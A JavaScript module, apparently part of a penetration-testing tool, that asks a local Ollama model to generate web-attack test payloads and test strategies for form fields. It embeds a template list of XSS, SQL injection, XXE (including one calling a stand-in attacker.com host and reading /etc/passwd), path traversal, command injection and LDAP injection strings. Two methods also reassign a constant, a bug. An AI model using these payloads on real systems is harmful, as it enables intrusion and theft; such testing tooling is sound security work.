// Ollama LLM Integration Module
// This module provides AI-assisted payload generation using locally deployed Ollama models

export default class OllamaPayloadAssistant {
  constructor(baseUrl = 'http://127.0.0.1:11434') {
    this.baseUrl = baseUrl;
    this.model = 'llama3'; // Default model; change to 'mistral' or any installed tag
    this.isAvailable = false;
  this.lastErrorMessage = '';
    this.checkAvailability();
  }

  async checkAvailability() {
    try {
      const response = await fetch(`${this.baseUrl}/api/tags`);
      if (response.ok) {
        const data = await response.json();
        this.isAvailable = true;
        console.log('✅ Ollama is available. Models:', data.models);
        this.lastErrorMessage = '';
        return true;
      } else {
        console.log('⚠️ Ollama responded with status:', response.status, response.statusText);
        this.isAvailable = false;
        this.lastErrorMessage = `HTTP ${response.status} ${response.statusText}`;
      }
    } catch (error) {
      console.log('⚠️ Ollama not available:', error.message);
      this.isAvailable = false;
      this.lastErrorMessage = error.message;
    }
    return false;
  }

  async generatePayload(context) {
    if (!this.isAvailable) {
      throw new Error('Ollama is not available. Please start Ollama service.');
    }

    const prompt = this.buildPrompt(context);
    
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 20000);
      const response = await fetch(`${this.baseUrl}/api/generate`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: this.model,
          prompt: prompt,
          stream: false,
          options: {
            temperature: 0.7,
            top_p: 0.9
          }
        }),
        signal: controller.signal,
      });
      clearTimeout(timeout);

      if (!response.ok) {
        // Try to capture and include the response body to make errors (like 403) actionable
        let bodyText = '';
        try {
          bodyText = await response.text();
        } catch (e) {
          bodyText = '<no-body>'; 
        }
        const msg = `Ollama API error: ${response.status} ${response.statusText} ${bodyText}`;
        throw new Error(msg);
      }

      const ct = response.headers.get('content-type') || '';
      if (ct.includes('application/json')) {
        const data = await response.json();
        return this.parsePayloadResponse(data.response || '');
      }

      // Fallback: stream/NDJSON parsing
      const reader = response.body.getReader();
      const decoder = new TextDecoder('utf-8');
      let full = '';
      while (true) {
        const { value, done } = await reader.read();
        if (done) break;
        const chunk = decoder.decode(value, { stream: true });
        // NDJSON lines; accumulate response fields
        const lines = chunk.split(/\r?\n/).filter(Boolean);
        for (const line of lines) {
          try {
            const obj = JSON.parse(line);
            if (obj && typeof obj.response === 'string') {
              full += obj.response;
            }
            if (obj && obj.done) {
              break;
            }
          } catch (_) {
            // ignore partial lines
          }
        }
      }
      return this.parsePayloadResponse(full);
    } catch (error) {
      console.error('Payload generation error:', error);
      this.lastErrorMessage = String(error?.message || error);
      throw error;
    }
  }

  buildPrompt(context) {
    const { elementType, elementName, testType, vulnerability } = context;

    let prompt = `You are a security testing assistant. Generate a safe, educational test payload for security testing in an authorized lab environment.\n\n`;
    prompt += `Context:\n`;
    prompt += `- Element Type: ${elementType}\n`;
    prompt += `- Element Name: ${elementName}\n`;
    prompt += `- Test Type: ${testType}\n`;
    prompt += `- Target Vulnerability: ${vulnerability || 'General testing'}\n\n`;
    prompt += `Requirements:\n`;
    prompt += `1. Payload must be safe and educational\n`;
    prompt += `2. Designed for authorized testing only\n`;
    prompt += `3. Should not cause harm to systems\n`;
    prompt += `4. Include explanation of what the payload tests\n\n`;
    prompt += `Generate the payload and explain its purpose. Format: [PAYLOAD] <payload_here> [EXPLANATION] <explanation_here>`;

    return prompt;
  }

  parsePayloadResponse(response) {
    // Parse the LLM response to extract payload and explanation
    const payloadMatch = response.match(/\[PAYLOAD\](.*?)\[EXPLANATION\]/s);
    const explanationMatch = response.match(/\[EXPLANATION\](.*?)$/s);

    return {
      payload: payloadMatch ? payloadMatch[1].trim() : response,
      explanation: explanationMatch ? explanationMatch[1].trim() : 'No explanation provided',
      rawResponse: response
    };
  }

  async suggestVulnerability(elementInfo) {
    if (!this.isAvailable) {
      return null;
    }

    const prompt = `As a security expert, analyze this form element and suggest potential vulnerabilities to test:\n\n`;
    prompt += `Element Type: ${elementInfo.type}\n`;
    prompt += `Element Name: ${elementInfo.name}\n`;
    prompt += `Element ID: ${elementInfo.id}\n`;
    prompt += `Required: ${elementInfo.required}\n\n`;
    prompt += `List 3 most relevant security tests for this element. Be concise.`;

    try {
      const response = await fetch(`${this.baseUrl}/api/generate`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: this.model,
          prompt: prompt,
          stream: false
        })
      });

      const data = await response.json();
      return data.response;
    } catch (error) {
      console.error('Vulnerability suggestion error:', error);
      return null;
    }
  }

  async generateTestStrategy(pageContext) {
    if (!this.isAvailable) {
      return null;
    }

    const prompt = `As a penetration testing expert, create a test strategy for this web application:\n\n`;
    prompt += `URL: ${pageContext.url}\n`;
    prompt += `Forms Found: ${pageContext.formsFound}\n`;
    prompt += `Inputs: ${pageContext.inputsFound}\n`;
    prompt += `File Uploads: ${pageContext.fileInputsFound}\n\n`;
    prompt += `Provide a prioritized test strategy with specific attack vectors to test. Keep it concise and actionable.`;

    try {
      const response = await fetch(`${this.baseUrl}/api/generate`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: this.model,
          prompt: prompt,
          stream: false
        })
      });

      const data = await response.json();
      return data.response;
    } catch (error) {
      console.error('Test strategy generation error:', error);
      return null;
    }
  }

  // Predefined payload templates for common vulnerabilities
  getTemplatePayloads() {
    return {
      xss: [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<svg onload=alert("XSS")>'
      ],
      sqli: [
        "' OR '1'='1",
        "1' OR '1' = '1' --",
        "admin'--",
        "' UNION SELECT NULL, NULL, NULL--"
      ],
      xxe: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>'
      ],
      pathTraversal: [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd'
      ],
      commandInjection: [
        '; ls -la',
        '| whoami',
        '`id`',
        '$(cat /etc/passwd)'
      ],
      ldap: [
        '*',
        'admin)(&',
        '*)(&',
        '*)(uid=*'
      ]
    };
  }

  setModel(modelName) {
    this.model = modelName;
    console.log(`Ollama model set to: ${modelName}`);
  }

  setBaseUrl(url) {
    this.baseUrl = url;
    console.log(`Ollama base URL set to: ${url}`);
  }

  getLastError() {
    return this.lastErrorMessage;
  }

  async listAvailableModels() {
    try {
      const response = await fetch(`${this.baseUrl}/api/tags`);
      if (response.ok) {
        const data = await response.json();
        return data.models.map(m => m.name);
      }
    } catch (error) {
      console.error('Error listing models:', error);
    }
    return [];
  }
}

// Also support CommonJS for tooling environments
if (typeof module !== 'undefined' && module.exports) {
  module.exports = OllamaPayloadAssistant;
}

// Usage Example:
/*
const assistant = new OllamaPayloadAssistant();

// Check if Ollama is running
await assistant.checkAvailability();

// Generate a custom payload
const payload = await assistant.generatePayload({
  elementType: 'input',
  elementName: 'username',
  testType: 'SQL Injection',
  vulnerability: 'Authentication Bypass'
});

console.log('Generated Payload:', payload.payload);
console.log('Explanation:', payload.explanation);

// Get vulnerability suggestions
const suggestions = await assistant.suggestVulnerability({
  type: 'input',
  name: 'search',
  id: 'search-box',
  required: false
});

console.log('Suggested Tests:', suggestions);

// Generate test strategy
const strategy = await assistant.generateTestStrategy({
  url: 'http://localhost/dvwa',
  formsFound: 5,
  inputsFound: 12,
  fileInputsFound: 2
});

console.log('Test Strategy:', strategy);

// Use template payloads
const templates = assistant.getTemplatePayloads();
console.log('XSS Templates:', templates.xss);
*/
